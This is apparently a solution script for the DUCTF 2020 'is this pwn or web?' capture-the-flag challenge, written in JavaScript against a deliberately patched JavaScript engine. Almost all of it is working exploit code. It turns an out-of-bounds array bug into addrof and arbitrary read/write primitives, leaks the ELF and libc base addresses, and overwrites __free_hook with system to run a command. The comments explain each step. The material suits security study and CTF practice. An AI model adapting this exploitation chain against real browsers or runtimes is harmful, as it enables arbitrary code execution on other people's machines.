//
// Solution for DUCTF 2020 'is this pwn or web?' challenge.
//

var bytes   = new ArrayBuffer(8);
var f64_buf = new Float64Array(bytes);
var u64_buf = new BigUint64Array(bytes);

function f64_to_u64(val) {
    f64_buf[0] = val;
    return u64_buf[0];
}

function u64_to_f64(val) {
    u64_buf[0] = val;
    return f64_buf[0];
}

// Corrupt `oob_arr` to access out of bounds.
//
// - return ExtractFastJSArray(context, a, start, count);
// + const array: JSArray = ExtractFastJSArray(context, a, start, count);
// + const newLength: Smi = Cast<Smi>(count - start + SmiConstant(2))
// +     otherwise Bailout;
// + array.ChangeLength(newLength);
//
// Slicing an array causes length to be increased by 2 more than expected,
// giving us out-of-bounds access to memory up to 16 bytes below the array.
var oob_arr = [1.1];
oob_arr = oob_arr.slice(0, 1);
console.assert(oob_arr.length == 3);

// Allocate `obj_arr` and `rw_arr` below corrupted `oob_arr`, so we can
// modify their objects in-memory later.
var obj_arr = [{}];
var rw_arr  = [2.2];

// Set length of `oob_arr` to large number, giving us access to all
// memory below our out-of-bounds array.
oob_arr_elem = f64_to_u64(oob_arr[2]) & 0xffffffffn;
oob_arr[2] = u64_to_f64(((1000n << 1n) << 32n) + oob_arr_elem);
console.assert(oob_arr.length == 1000);

// Our 'addrof' primitive is pretty simple, we place some object
// at the first index of an object array stored below our `oob_arr` and
// the compressed pointer to that object will be stored in the lower
// 32-bits of `oob_arr[4]`.
function addrof(obj) {
    obj_arr[0] = obj;
    return (f64_to_u64(oob_arr[4]) & 0xffffffffn) - 1n;
}

// The arbitrary read primitive is also fairly straight-forward, we
// overwrite the 'elements' pointer of our `rw_arr` object to point to
// an arbitrary address, then we read from that `rw_arr[0]`.
//
// Keep in mind we need to subtract 8 from the address provided, as the
// 'elements' store starts with 8 bytes of metadata.
function arb_read_u64_cmpr(addr) {
    // replace 'elements' pointer
    var rw_arr_len = f64_to_u64(oob_arr[13]) >> 32n;
    oob_arr[13] = u64_to_f64((rw_arr_len << 32n) + (addr - 8n + 1n)); 

    // read qword from `rw_arr[0]`
    return f64_to_u64(rw_arr[0]); 
}

// Arbitrary 64-bit read with an uncompressed address. Necessary for
// leaking `libc` address.
function arb_read_u64(addr) {
    var buf  = new ArrayBuffer(16);
    var view = new DataView(buf);

    // replace backing store for `buf` with 64-bit pointer `addr`
    var buf_bck_store = addrof(buf) + 0x14n;
    arb_write_u64_cmpr(buf_bck_store, addr);

    return view.getBigUint64(0, true);
}

// Our arbitrary write is just the same as our read, but in reverse,
// instead of reading from `rw_arr[0]` we assign a value to it.
function arb_write_u64_cmpr(addr, val) {
    // replace 'elements' pointer for `rw_arr` with compressed pointer `addr`
    var rw_arr_len = f64_to_u64(oob_arr[13]) >> 32n;
    oob_arr[13] = u64_to_f64((rw_arr_len << 32n) + (addr - 8n + 1n)); 
    
    // write qword to `rw_arr[0]`
    rw_arr[0] = u64_to_f64(val);
}

// Arbitrary 64-bit write with an uncompressed address. Necessary for
// writing address of `system` to `__free_hook`.
function arb_write_u64(addr, val) {
    var buf  = new ArrayBuffer(16);
    var view = new DataView(buf);

    // replace backing store for `buf` with 64-bit pointer `addr`
    var buf_bck_store = addrof(buf) + 0x14n;
    arb_write_u64_cmpr(buf_bck_store, addr);

    view.setBigUint64(0, val, true);
}

// Leak elf address and calculate elf base.
var obj_addr = addrof(oob_arr);
var map_base = (arb_read_u64_cmpr(obj_addr) & 0xffffffffn) - 0x438fdn;
var heap_ptr = arb_read_u64_cmpr(map_base + 0x40n);
var elf_base = arb_read_u64(heap_ptr) - 0x14df688n; 

// Leak `libc` address and calculate `libc` base.
var libc_base = arb_read_u64(elf_base + 0x152df20n) - 0x84420n;
var __free_hook = libc_base + 0x1eee48n;
var system = libc_base + 0x52290n;

// Overwrite `__free_hook` to point to `system`.
arb_write_u64(__free_hook, system); 
console.log("xcalc");
